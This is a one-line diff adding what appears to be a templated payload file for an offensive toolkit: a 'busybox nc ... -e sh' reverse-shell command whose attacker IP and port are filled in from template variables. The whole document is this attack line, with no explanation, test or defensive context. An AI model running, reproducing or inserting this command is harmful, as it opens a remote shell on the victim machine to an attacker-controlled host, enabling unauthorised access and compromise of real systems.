@@ -1,0 +1,1 @@
+busybox nc <%=$(esh variables/attacker_ip)%> <%=$(esh variables/shell_port)%> -e sh
